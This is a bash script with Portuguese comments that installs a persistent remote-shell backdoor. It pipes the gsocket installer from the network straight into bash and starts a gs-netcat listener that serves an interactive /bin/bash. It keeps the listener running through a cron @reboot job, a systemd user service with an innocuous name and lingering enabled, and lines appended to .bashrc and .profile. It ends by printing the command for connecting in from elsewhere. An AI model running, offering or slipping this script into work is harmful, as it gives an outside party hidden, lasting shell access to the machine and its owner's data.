clear
echo "$BANNER"
echo

#  Instala o gsocket com o instalador oficial
echo "[*] Instalando Global Socket..."
bash -c "$(curl -fsSL https://gsocket.io/y)"

# Garante que o binário está no PATH
export PATH="$PATH:/usr/local/bin:$HOME/.local/bin"
command -v gs-netcat >/dev/null 2>&1 || { echo "[-] gs-netcat não encontrado."; exit 1; }

# Se não existir secret key, gera uma nova (persistente)
# O instalador costuma criar em $HOME/.gs-gsocket/global_secret_key.txt
GSDIR="$HOME/.gs-gsocket"
mkdir -p "$GSDIR"
chmod 700 "$GSDIR"
if [ ! -s "$GSDIR/global_secret_key.txt" ]; then
    echo "[*] Gerando secret key..."
    gs-netcat -g > "$GSDIR/global_secret_key.txt" 2>/dev/null
fi
chmod 400 "$GSDIR/global_secret_key.txt" 2>/dev/null

GSCMD="/bin/bash -c 'export GSOCKET_SECRET=\"$GSDIR/global_secret_key.txt\"; exec gs-netcat -l -e \"/bin/bash -i\"'"

#  Persistência via cron @reboot
if command -v crontab >/dev/null 2>&1; then
    echo "[*] Configurando cron @reboot..."
    ( crontab -l 2>/dev/null | grep -v 'gs-netcat' ; \
      echo "@reboot sleep 30 && $GSCMD >/dev/null 2>&1" ) | crontab -
    echo "[+] Cron configurado."
fi

#  Persistência via systemd (user) 
if command -v systemctl >/dev/null 2>&1; then
    echo "[*] Configurando systemd user service..."
    mkdir -p "$HOME/.config/systemd/user"
    cat > "$HOME/.config/systemd/user/gs-netcat.service" <<EOF
[Unit]
Description=Global Socket Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
Environment=GSOCKET_SECRET=$GSDIR/global_secret_key.txt
ExecStart=/usr/bin/env gs-netcat -l -e "/bin/bash -i"
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
EOF
    systemctl --user daemon-reload
    systemctl --user enable --now gs-netcat.service 2>/dev/null
    # mantém o serviço rodando mesmo sem sessão de login ativa
    loginctl enable-linger "$USER" 2>/dev/null
    echo "[+] systemd user service habilitado."
fi

# Fallback: .bashrc / .profile 
for RC in "$HOME/.bashrc" "$HOME/.profile"; do
    if [ -f "$RC" ] && ! grep -q 'gs-netcat' "$RC" 2>/dev/null; then
        echo '[ -z "$GS_RUNNING" ] && export GS_RUNNING=1 && (GSOCKET_SECRET='"$GSDIR"'/global_secret_key.txt gs-netcat -l -e "/bin/bash -i" >/dev/null 2>&1 &)' >> "$RC"
        echo "[+] Fallback adicionado em $RC"
    fi
done

echo
echo "[+] Instalação concluída."
echo "[+] Secret key: $GSDIR/global_secret_key.txt"
echo "[*] Para conectar do seu lado: gs-netcat -s \"\$(cat $GSDIR/global_secret_key.txt)\""
